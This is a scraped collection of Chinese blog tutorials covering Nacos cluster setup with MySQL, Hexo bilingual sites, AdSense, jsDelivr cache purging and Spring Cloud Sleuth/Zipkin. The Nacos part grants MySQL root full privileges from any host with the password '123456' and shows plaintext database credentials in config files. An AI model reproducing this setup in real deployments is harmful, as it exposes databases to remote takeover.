123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196CREATE DATABASE nacos_config;USE nacos_config;/* 数据库全名 = nacos_config *//* 表名称 = config_info *//******************************************/CREATE TABLE `config_info` (`id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id',`data_id` varchar(255) NOT NULL COMMENT 'data_id',`group_id` varchar(255) DEFAULT NULL,`content` longtext NOT NULL COMMENT 'content',`md5` varchar(32) DEFAULT NULL COMMENT 'md5',`gmt_create` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '创建时间',`gmt_modified` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '修改时间',`src_user` text COMMENT 'source user',`src_ip` varchar(20) DEFAULT NULL COMMENT 'source ip',`app_name` varchar(128) DEFAULT NULL,`tenant_id` varchar(128) DEFAULT '' COMMENT '租户字段',`c_desc` varchar(256) DEFAULT NULL,`c_use` varchar(64) DEFAULT NULL,`effect` varchar(64) DEFAULT NULL,`type` varchar(64) DEFAULT NULL,`c_schema` text,PRIMARY KEY (`id`),UNIQUE KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_info';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = config_info_aggr *//******************************************/CREATE TABLE `config_info_aggr` (`id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id',`data_id` varchar(255) NOT NULL COMMENT 'data_id',`group_id` varchar(255) NOT NULL COMMENT 'group_id',`datum_id` varchar(255) NOT NULL COMMENT 'datum_id',`content` longtext NOT NULL COMMENT '内容',`gmt_modified` datetime NOT NULL COMMENT '修改时间',`app_name` varchar(128) DEFAULT NULL,`tenant_id` varchar(128) DEFAULT '' COMMENT '租户字段',PRIMARY KEY (`id`),UNIQUE KEY `uk_configinfoaggr_datagrouptenantdatum` (`data_id`,`group_id`,`tenant_id`,`datum_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='增加租户字段';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = config_info_beta *//******************************************/CREATE TABLE `config_info_beta` (`id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id',`data_id` varchar(255) NOT NULL COMMENT 'data_id',`group_id` varchar(128) NOT NULL COMMENT 'group_id',`app_name` varchar(128) DEFAULT NULL COMMENT 'app_name',`content` longtext NOT NULL COMMENT 'content',`beta_ips` varchar(1024) DEFAULT NULL COMMENT 'betaIps',`md5` varchar(32) DEFAULT NULL COMMENT 'md5',`gmt_create` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '创建时间',`gmt_modified` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '修改时间',`src_user` text COMMENT 'source user',`src_ip` varchar(20) DEFAULT NULL COMMENT 'source ip',`tenant_id` varchar(128) DEFAULT '' COMMENT '租户字段',PRIMARY KEY (`id`),UNIQUE KEY `uk_configinfobeta_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_info_beta';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = config_info_tag *//******************************************/CREATE TABLE `config_info_tag` (`id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id',`data_id` varchar(255) NOT NULL COMMENT 'data_id',`group_id` varchar(128) NOT NULL COMMENT 'group_id',`tenant_id` varchar(128) DEFAULT '' COMMENT 'tenant_id',`tag_id` varchar(128) NOT NULL COMMENT 'tag_id',`app_name` varchar(128) DEFAULT NULL COMMENT 'app_name',`content` longtext NOT NULL COMMENT 'content',`md5` varchar(32) DEFAULT NULL COMMENT 'md5',`gmt_create` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '创建时间',`gmt_modified` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '修改时间',`src_user` text COMMENT 'source user',`src_ip` varchar(20) DEFAULT NULL COMMENT 'source ip',PRIMARY KEY (`id`),UNIQUE KEY `uk_configinfotag_datagrouptenanttag` (`data_id`,`group_id`,`tenant_id`,`tag_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_info_tag';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = config_tags_relation *//******************************************/CREATE TABLE `config_tags_relation` (`id` bigint(20) NOT NULL COMMENT 'id',`tag_name` varchar(128) NOT NULL COMMENT 'tag_name',`tag_type` varchar(64) DEFAULT NULL COMMENT 'tag_type',`data_id` varchar(255) NOT NULL COMMENT 'data_id',`group_id` varchar(128) NOT NULL COMMENT 'group_id',`tenant_id` varchar(128) DEFAULT '' COMMENT 'tenant_id',`nid` bigint(20) NOT NULL AUTO_INCREMENT,PRIMARY KEY (`nid`),UNIQUE KEY `uk_configtagrelation_configidtag` (`id`,`tag_name`,`tag_type`),KEY `idx_tenant_id` (`tenant_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_tag_relation';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = group_capacity *//******************************************/CREATE TABLE `group_capacity` (`id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键ID',`group_id` varchar(128) NOT NULL DEFAULT '' COMMENT 'Group ID，空字符表示整个集群',`quota` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '配额，0表示使用默认值',`usage` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '使用量',`max_size` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个配置大小上限，单位为字节，0表示使用默认值',`max_aggr_count` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '聚合子配置最大个数，，0表示使用默认值',`max_aggr_size` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值',`max_history_count` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '最大变更历史数量',`gmt_create` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '创建时间',`gmt_modified` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '修改时间',PRIMARY KEY (`id`),UNIQUE KEY `uk_group_id` (`group_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='集群、各Group容量信息表';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = his_config_info *//******************************************/CREATE TABLE `his_config_info` (`id` bigint(64) unsigned NOT NULL,`nid` bigint(20) unsigned NOT NULL AUTO_INCREMENT,`data_id` varchar(255) NOT NULL,`group_id` varchar(128) NOT NULL,`app_name` varchar(128) DEFAULT NULL COMMENT 'app_name',`content` longtext NOT NULL,`md5` varchar(32) DEFAULT NULL,`gmt_create` datetime NOT NULL DEFAULT '2010-05-05 00:00:00',`gmt_modified` datetime NOT NULL DEFAULT '2010-05-05 00:00:00',`src_user` text,`src_ip` varchar(20) DEFAULT NULL,`op_type` char(10) DEFAULT NULL,`tenant_id` varchar(128) DEFAULT '' COMMENT '租户字段',PRIMARY KEY (`nid`),KEY `idx_gmt_create` (`gmt_create`),KEY `idx_gmt_modified` (`gmt_modified`),KEY `idx_did` (`data_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='多租户改造';/******************************************//* 数据库全名 = nacos_config *//* 表名称 = tenant_capacity *//******************************************/CREATE TABLE `tenant_capacity` (`id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键ID',`tenant_id` varchar(128) NOT NULL DEFAULT '' COMMENT 'Tenant ID',`quota` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '配额，0表示使用默认值',`usage` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '使用量',`max_size` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个配置大小上限，单位为字节，0表示使用默认值',`max_aggr_count` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '聚合子配置最大个数',`max_aggr_size` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值',`max_history_count` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '最大变更历史数量',`gmt_create` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '创建时间',`gmt_modified` datetime NOT NULL DEFAULT '2010-05-05 00:00:00' COMMENT '修改时间',PRIMARY KEY (`id`),UNIQUE KEY `uk_tenant_id` (`tenant_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='租户容量信息表';CREATE TABLE `tenant_info` (`id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id',`kp` varchar(128) NOT NULL COMMENT 'kp',`tenant_id` varchar(128) default '' COMMENT 'tenant_id',`tenant_name` varchar(128) default '' COMMENT 'tenant_name',`tenant_desc` varchar(256) DEFAULT NULL COMMENT 'tenant_desc',`create_source` varchar(32) DEFAULT NULL COMMENT 'create_source',`gmt_create` bigint(20) NOT NULL COMMENT '创建时间',`gmt_modified` bigint(20) NOT NULL COMMENT '修改时间',PRIMARY KEY (`id`),UNIQUE KEY `uk_tenant_info_kptenantid` (`kp`,`tenant_id`),KEY `idx_tenant_id` (`tenant_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='tenant_info';CREATE TABLE users ( username varchar(50) NOT NULL PRIMARY KEY, password varchar(500) NOT NULL, enabled boolean NOT NULL);CREATE TABLE roles ( username varchar(50) NOT NULL, role varchar(50) NOT NULL);INSERT INTO users (username, password, enabled) VALUES ('nacos', '$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu', TRUE);INSERT INTO roles (username, role) VALUES ('nacos', 'ROLE_ADMIN'); nacos-server-1.1.4\\nacos\\conf目录下找到application.properties mysql8.0+后面加上时区serverTimezone=UTC123456789101112131415spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://11.162.196.16:3306/nacos_devtest?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=truedb.user=nacos_devtestdb.password=youdontknow##################################################spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://localhost:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=truedb.user=rootdb.password=123456 启动nacos，可以看到是个全新的空记录界面，以前是记录进derby Linux版Nacos+MySQL生产环境配置 预计需要，1个nginx+3个nacos注册中心+1个mysql Nacos下载linux版本 https://github.com/alibaba/nacos/releases/tag/1.1.4 nacos-server-1.1.4.tar.gz 解压到/opt 拷贝 1cp -r nacos &#x2F;mynacos&#x2F; cd /mynacos/nacos/ cd bin 执行,执行之前把原始的配置备份一遍。 12cp startup.sh startup.sh.bkstartup.sh 解压后安装 集群配置步骤1.Linux服务器上mysql数据库配置SQL脚本在哪里 sql语句源文件nacos-mysql.sql 自己Linux机器上的Mysql数据库黏贴 2.application.properties配置位置 内容123456spring.datasource.platform=mysql db.num=1db.url.0=jdbc:mysql://1.7.0.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=truedb.user=rootdb.password=HF_mysql_654321 123mysql 授权远程访问GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION;flush privileges; 3.Linux服务器上nacos的集群配置cluster.conf梳理出3台nacos机器的不同服务端口号 复制出cluster.conf 内容 这个IP不能写127.0.0.1,必须是Linux命令hostname -i能够识别的IP 或者ifconfig 4.编辑Nacos的启动脚本startup.sh，使它能够接受不同的启动端/mynacos/nacos/bin目录下有startup.sh在什么地方，修改什么，怎么修改 思考 修改内容 1cp startup.sh startup.sh.bk 执行方式 5.Nginx的配置，由它作为负载均衡器修改nginx的配置文件 nginx.conf upstream cluster{ server 127.0.0.1:3333; server 127.0.0.1:4444; server 127.0.0.1:5555; } server{ listen 1111; server_name localhost; location /{ proxy_pass http://cluster; } ….省略 按照指定启动 123ps -ef|grep nacos|grep -v grep |wc -l--------------3 3个微服务已启动 6.截止到此处，1个Nginx+3个nacos注册中心+1个mysql测试通过nginx访问nacos 1https://写你自己虚拟机的ip:1111/nacos/#/login 新建一个配置测试 1mysql&gt; select * from config_info; linux服务器的mysql插入一条记录 测试微服务cloudalibaba-provider-payment9002启动注册进nacos集群 yml 1server-addr: 写你自己的虚拟机ip:1111 结果 高可用小总结","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Traffic monetization:Access to Google Adsense","slug":"接入谷歌广告联盟Adsense","date":"2020-08-20T23:23:22.000Z","updated":"2021-04-11T17:11:28.884Z","comments":true,"path":"traffic-monetizationaccess-to-google-adsense/","link":"","permalink":"https://kayleh.top/traffic-monetizationaccess-to-google-adsense/","excerpt":"流量变现: 接入谷歌广告联盟 https://kayleh.top","text":"流量变现: 接入谷歌广告联盟 https://kayleh.top 网站域名必须为顶级域名!! 按照官网的文档进行 把adsense代码写进head标签内，每个网站的head都要有这个标签 提交后谷歌会进行审核，一般为几天 注意审核期间不能把代码片段删除,不要大量修改网站内容,不要随意更换域名. 审核标准一般认为最重要的是这几点: 内容原创,原创内容对谷歌审核十分重要 编入谷歌索引,提交站点地图sitemap.xml! 审核通过后,就可以发布广告啦! 进入主页,adsense提示要编写ads.txt,下载文件,并保存到项目的根目录里. 保存后可以测试是否写入成功, 如网站是yousite.com,那么访问yousite.com应该能访问这个文件. 屏蔽不合适的广告内容点击内容查看中心, 这里可以屏蔽你不想投放的广告内容.(移动网络应用等)","categories":[],"tags":[{"name":"ad","slug":"ad","permalink":"https://kayleh.top/tags/ad/"}]},{"title":"中英文切换","slug":"中英文切换","date":"2020-08-20T19:28:18.000Z","updated":"2021-04-11T17:11:28.559Z","comments":true,"path":"chinese-and-english-switching/","link":"","permalink":"https://kayleh.top/chinese-and-english-switching/","excerpt":"hexo","text":"hexo 感谢[陈年沉念] 的博文分享。 具体操作请参阅陈年沉念的博文 。 本文只提出几点需要特别注意的事项。 *第一, 有两个“点号” 在“/public/en” 的前面: 12345修改&#x2F;en&#x2F;_config.yml，修改内容如下： language: en &lt;&#x2F;br&gt; root: &#x2F;en&#x2F; &lt;&#x2F;br&gt; public_dir: ..&#x2F;public&#x2F;en &lt;&#x2F;br&gt; 第二, 也有两个“点号” 在 “commonweal:” 的前面: 123接下来在英文网站中添加中文入口。编辑&#x2F;en&#x2F;_config.yml，修改menu:中如下内容： commonweal: ..&#x2F; 顺便说一句, [陈年沉念]写的”/update.bat” 很方便且实用。 最后，我自己再补充一点，就是在完全Copy完Hexo网站跟目录的内容后，在新建的/en/文件夹下，node_modules文件夹里面的代码可能不能被完全复制粘贴，此时需要在/en/文件夹下运行以下代码方可顺利发布/en/到网络端： 先 鼠标右键 git bash here，然后运行 12345678910111213141516npm install hexo --savenpm installnpm install hexo-generator-index --savenpm install hexo-generator-archive --savenpm install hexo-generator-category --savenpm install hexo-generator-tag --savenpm install hexo-server --savenpm install hexo-deployer-git --savenpm install hexo-deployer-heroku --savenpm install hexo-deployer-rsync --savenpm install hexo-deployer-openshift --savenpm install hexo-renderer-marked@0.2 --savenpm install hexo-renderer-stylus@0.2 --savenpm install hexo-generator-feed@1 --savenpm install hexo-generator-sitemap@1 --save 完成上述附加的必要操作后，就可以顺利推送双语或多语博客到网络端啦。 转载来源： https://chenyxmr.github.io/2016/08/04/hexo-bilingual/ 前言搭建个人博客时采用的hexo非常方便，但由于本人比较喜欢英语所以希望能搭建一个双语网站同步更新内容，hexo官方有提供国际化解决方案，具体参见链接https://hexo.io/zh-cn/docs/internationalization.html 。 但本人由于悟性比较低没有看明白这个插件应该怎么用，就索性自己用一个非常简单粗暴的方式实现了中英文双语网站。 首先，最终效果见本站。菜单栏中点击-&gt;English切换到英文网站，英文网站中点击-&gt;简体中文即切换回中文。当然每篇博文都需要自己翻译。 搭建教程完整复制网站 首先，将网站根目录全部复制，然后在网站根目录下建立en/文件夹并将所复制的内容粘贴至此。此时en/文件夹下有一份完整的网站文件，也就是说这是一个独立的hexo博客。 en即为English的缩写，代表英文网站，当然也可以添加其它语言，文件夹名字随个人喜好。 更改英文网站配置 修改/en/_config.yml，修改内容如下： language: enroot: /en/public_dir: ../public/en 这里的public_dir代表最终生成静态文件的位置，由于最后要将英文网站静态网页跟中文静态网页放到同一根目录下，所以要进行修改。 添加语言切换入口 首先在中文网站中添加切换英文入口。语言切换入口对应网站的menu，编辑/_config.yml，修改menu:中如下内容： commonweal: /en 这个键值对应所建立的英文网站文件夹的名称。 此处应该添加一个新的入口，但由于我的添加一直不正常所以直接将原有的公益菜单改成切换语言了~ 再编辑/themes/next/languages/zh-Hans.yml，在menu:中修改如下字段： commonweal: -&gt;English 这个键值对应切换语言选项显示的内容。 接下来在英文网站中添加中文入口。编辑/en/_config.yml，修改menu:中如下内容： commonweal: ../ 再编辑/en/themes/next/languages/en.yml，在menu:中修改如下字段： commonweal: -&gt;简体中文 至此中英文站点即配置完成,如果英文网站需要更改细节直接更改en/下对应的文件就可以，和修改中文网站完全一样~ 新建博文 每次在中文站点下新建博文并写好后，将博文复制到英文网站对应的目录下并修改成英文博文。 关于Hexo的中英文语言配置，我的做法是，在菜单栏添加一个按键，通过按键切换到中/英文界面，让中文文章只显示在中文页面，英文显示在英文页面。 插件安装首先，安装hexo-generator-i18n插件 1npm install hexo-generator-i18n --save 然后修改_config.yml 1language: [zh-CN,en]# hexo-generator-i18n 选项（可选，默认使用如下设置）i18n: type: [page, post] generator: [index, archive, category, tag] 这里并没有明白tyte和generator的作用，但是似乎不影响 之后是在主题languages目录下添加对应的语言.yml文件(如zh.yml, en.yml)\\ 但是由于我使用的主题并不支持多语言，我也懒得弄，所有暂时没有管这一项 插件安装完成后，执行hexo clean &amp; hexo g 会生成public/en目录，对于_post内的所有博文，都会在public里存放一份，en下存放一份。 那么就需要根据页面的语言，显示不同的博文。 博文配置对于所有的markdown文章，都需要在文章内添加属性lang:zh-CN or lang:en，来区分中英文 网页配置我通过url来区分中英文页面，对于中文，url是www.yoursite.com，英文，url是www.yoursite.com/en/, 这样，在js中检索url是否包含en，来判断显示中文还是英文界面。 修改主题, 我的主题路径是themes/vexo/layout/index.ejs 获取当前html的路径，并判断路径内是否存在en 123456789101112131415161718192021222324252627282930313233&lt;main class&#x3D;&quot;app-body&quot;&gt; &lt;% var currentURL &#x3D; page.path.split(&#39;&#x2F;&#39;) %&gt; &lt;% if (currentURL.length &#x3D;&#x3D;&#x3D; 1) &#123; %&gt; &lt;% var lang &#x3D; page.lang %&gt; &lt;% &#125; else &#123; %&gt; &lt;% var lang &#x3D; currentURL.shift() %&gt; &lt;% &#125; %&gt; &lt;% page.posts.each(function(post) &#123; %&gt; &lt;% if (lang &#x3D;&#x3D; post.lang) &#123; %&gt; &lt;article class&#x3D;&quot;article-card&quot;&gt; &lt;h2 class&#x3D;&quot;article-head&quot;&gt; &lt;a href&#x3D;&quot;&lt;%- url_for(post.path) %&gt;&quot;&gt;&lt;%- post.title %&gt;&lt;&#x2F;a&gt; &lt;&#x2F;h2&gt; &lt;p class&#x3D;&quot;article-date&quot;&gt;&lt;%- date(post.date, &quot;LL&quot;) %&gt;&lt;&#x2F;p&gt; &lt;% if (post.tags &amp;&amp; post.tags.length) &#123; %&gt; [ &lt;%- partial(&#39;_partial&#x2F;tag&#39;, &#123; tags: post.tags &#125;) %&gt;] &lt;% &#125; %&gt; &lt;div class&#x3D;&quot;article-summary&quot;&gt; &lt;% if (post.excerpt) &#123; %&gt; &lt;%- post.excerpt %&gt; &lt;% &#125; else &#123; %&gt; &lt;%- truncate(strip_html(post.content), &#123; length: 150, omission: &#39; ...&#39; &#125;) %&gt; &lt;% &#125; %&gt; &lt;&#x2F;div&gt; &lt;a class&#x3D;&quot;more&quot; href&#x3D;&quot;&lt;%- url_for(post.path) %&gt;&quot;&gt;&lt;%- theme.excerpt_link %&gt;&lt;&#x2F;a&gt; &lt;&#x2F;article&gt; &lt;% &#125; %&gt; &lt;% &#125;) %&gt; &lt;% if (page.total &gt; 1)&#123; %&gt; &lt;%- partial(&#39;_partial&#x2F;pager&#39;) %&gt; &lt;% &#125; %&gt;&lt;&#x2F;main&gt; 上述都完成，就可以通过www.yoursite.com/en进入英文网页，且该网页只有英文文章 添加切换语言按钮修改theme下的_config.yml文件, 添加一个EN的按钮，跳转到英文界面 1menu: Home: &#x2F; Tags: &#x2F;tags&#x2F; Archives: &#x2F;archives&#x2F; Projects: &#x2F;project&#x2F; About: &#x2F;about&#x2F; EN: &#x2F;en&#x2F; 这里为了简单，没有动态修改EN这个按钮，提供从英文网页，跳转回中文网页的方式(实际上，点击Home按键，就跳转回中文了) 部署测试1hexo clean &amp; hexo ghexo d 这里只配置了主页，其他页面暂时没有修改","categories":[],"tags":[{"name":"front","slug":"front","permalink":"https://kayleh.top/tags/front/"}]},{"title":"jsdelivr的CDN加速缓存不刷新问题","slug":"关于CDN加速缓存不刷新的解决","date":"2020-08-19T22:20:58.000Z","updated":"2021-04-11T17:11:28.620Z","comments":true,"path":"the-cdn-acceleration-cache-of-jsdelivr-does-not-refresh/","link":"","permalink":"https://kayleh.top/the-cdn-acceleration-cache-of-jsdelivr-does-not-refresh/","excerpt":"","text":"The CDN acceleration cache of jsdelivr does not refresh访问链接即可解决 具体： 把链接中的 https://cdn.jsdelivr.net替换成 https://purge.jsdelivr.net访问即可实时刷新","categories":[],"tags":[{"name":"maintain","slug":"maintain","permalink":"https://kayleh.top/tags/maintain/"}]},{"title":"SpringCloud Alibaba","slug":"分布式的微服务架构9","date":"2020-08-19T04:25:56.000Z","updated":"2021-04-11T17:11:28.750Z","comments":true,"path":"springcloud-alibaba/","link":"","permalink":"https://kayleh.top/springcloud-alibaba/","excerpt":"SpringCloud Alibaba","text":"SpringCloud Alibaba Spring Cloud Netflix项目进入维护模式 SpringCloud NetFlix Projects Entering Maintenance Mode 什么是维护模式 进入维护模式意味着什么呢？ SpringCloud alibaba带来了什么？ 能干吗 去哪下？ https://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md 怎么用？ &gt; Sentinel：把流量作为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。 Nacos：一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 RocketMQ：一款开源的分布式消息系统，基于高可用分布式集群技术，提供低延时的、高可靠的消息发布与订阅服务。 Dubbo：Apache Dubbo™ 是一款高性能 Java RPC 框架。 Seata：阿里巴巴开源产品，一个易于使用的高性能微服务分布式事务解决方案。 Alibaba Cloud ACM：一款在分布式架构环境中对应用配置进行集中管理和推送的应用配置中心产品。 Alibaba Cloud OSS: 阿里云对象存储服务（Object Storage Service，简称 OSS），是阿里云提供的海量、安全、低成本、高可靠的云存储服务。您可以在任何应用、任何时间、任何地点存储和访问任意类型的数据。 Alibaba Cloud SchedulerX: 阿里中间件团队开发的一款分布式任务调度产品，提供秒级、精准、高可靠、高可用的定时（基于 Cron 表达式）任务调度服务。 Alibaba Cloud SMS: 覆盖全球的短信服务，友好、高效、智能的互联化通讯能力，帮助企业迅速搭建客户触达通道。 资料获取官网 中文： https://github.com/alibaba/spring-cloud-alibaba/blob/master/README-zh.md","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud Sleuth分布式请求链路追踪","slug":"分布式的微服务架构8","date":"2020-08-19T01:52:50.000Z","updated":"2021-04-11T17:11:28.747Z","comments":true,"path":"springcloud-sleuth-distributed-request-link-tracking/","link":"","permalink":"https://kayleh.top/springcloud-sleuth-distributed-request-link-tracking/","excerpt":"SpringCloud Sleuth分布式请求链路追踪","text":"SpringCloud Sleuth分布式请求链路追踪 为什么会出现这个技术？需要解决哪些问题？ Spring Cloud Sleuth提供了一套完整的服务跟踪的解决方案 在分布式系统中提供追踪解决方案并且兼容支持了zipkin 解决 zipkin下载 SpringCloud从F版起已不需要自己构建Zipkin server了，只需要调用jar包即可 https://dl.bintray.com/openzipkin/maven/io/zipkin/java/zipkin-server/ zipkin-server-2.12.9.exec.jar 运行jar java -jar zipkin-server-2.12.9-exec.jar 运行控制台 http://localhost:9411/zipkin/ 完整的调用链路 Trace:类似于树结构的Span集合，表示一条调用链路，存在唯一标识 span:表示调用链路来源，通俗的理解span就是一次请求信息 服务提供者cloud-provider-payment8001 pom 12345&lt;!--包含了sleuth+zipkin--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt; &lt;/dependency&gt; yaml 12345678910111213141516171819202122232425262728293031323334server: port: 8001spring: application: name: cloud-payment-service zipkin: base-url: http://localhost:9411 sleuth: sampler: #采样率值介于0到1之间，1则表示全部采集 probability: 1 datasource: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: org.gjt.mm.mysql.Driver url: username: root password: mybatis: mapperLocations: classpath:mapper/*.xml type-aliases-package: com.kayleh.springcloud.entitieseureka: client: register-with-eureka: true fetchRegistry: true service-url: defaultZone: http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka #集群版 instance: instance-id: payment8001 prefer-ip-address: true 业务类OrderController 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package com.kayleh.springcloud.controller; import com.kayleh.springcloud.entities.CommonResult;import com.kayleh.springcloud.entities.Payment;import com.kayleh.springcloud.service.PaymentService;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.client.ServiceInstance;import org.springframework.web.bind.annotation.*;import org.springframework.cloud.client.discovery.DiscoveryClient; import javax.annotation.Resource;import java.util.List;import java.util.concurrent.TimeUnit; @RestController@Slf4jpublic class PaymentController&#123; @Resource private PaymentService paymentService; @Value(\"$&#123;server.port&#125;\") private String serverPort; @Resource private DiscoveryClient discoveryClient; @PostMapping(value = \"/payment/create\") public CommonResult create(@RequestBody Payment payment) &#123; int result = paymentService.create(payment); log.info(\"*****插入结果：\"+result); if(result &gt; 0) &#123; return new CommonResult(200,\"插入数据库成功,serverPort: \"+serverPort,result); &#125;else&#123; return new CommonResult(444,\"插入数据库失败\",null); &#125; &#125; @GetMapping(value = \"/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(\"id\") Long id) &#123; Payment payment = paymentService.getPaymentById(id); if(payment != null) &#123; return new CommonResult(200,\"查询成功,serverPort: \"+serverPort,payment); &#125;else&#123; return new CommonResult(444,\"没有对应记录,查询ID: \"+id,null); &#125; &#125; @GetMapping(value = \"/payment/discovery\") public Object discovery() &#123; List&lt;String&gt; services = discoveryClient.getServices(); for (String element : services) &#123; log.info(\"*****element: \"+element); &#125; List&lt;ServiceInstance&gt; instances = discoveryClient.getInstances(\"CLOUD-PAYMENT-SERVICE\"); for (ServiceInstance instance : instances) &#123; log.info(instance.getServiceId()+\"\\t\"+instance.getHost()+\"\\t\"+instance.getPort()+\"\\t\"+instance.getUri()); &#125; return this.discoveryClient; &#125; @GetMapping(value = \"/payment/lb\") public String getPaymentLB() &#123; return serverPort; &#125; @GetMapping(value = \"/payment/feign/timeout\") public String paymentFeignTimeout() &#123; // 业务逻辑处理正确，但是需要耗费3秒钟 try &#123; TimeUnit.SECONDS.sleep(3); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; return serverPort; &#125; @GetMapping(\"/payment/zipkin\") public String paymentZipkin() &#123; return \"hi ,i'am paymentzipkin server fall back，welcome to kayleh，O(∩_∩)O哈哈~\"; &#125;&#125; 服务消费者（调用方）cloud-consumer-order80 POM 12345&lt;!--包含了sleuth+zipkin--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt; &lt;/dependency&gt; yml 1234567891011121314151617181920212223server: port: 80 spring: application: name: cloud-order-service zipkin: base-url: http://localhost:9411 sleuth: sampler: probability: 1 eureka: client: #表示是否将自己注册进EurekaServer默认为true。 register-with-eureka: false #是否从EurekaServer抓取已有的注册信息，默认为true。单节点无所谓，集群必须设置为true才能配合ribbon使用负载均衡 fetchRegistry: true service-url: #单机 #defaultZone: http://localhost:7001/eureka # 集群 defaultZone: http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka # 集群版 业务类OrderController 1234567// ====================&gt; zipkin+sleuth @GetMapping(\"/consumer/payment/zipkin\") public String paymentZipkin() &#123; String result = restTemplate.getForObject(\"http://localhost:8001\"+\"/payment/zipkin/\", String.class); return result; &#125; 依次启动eureka7001/8001/8080调用8001几次测试下 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;zipkin 打开浏览器访问:http:localhost:9411会出现以下界面 查看 查看依赖关系 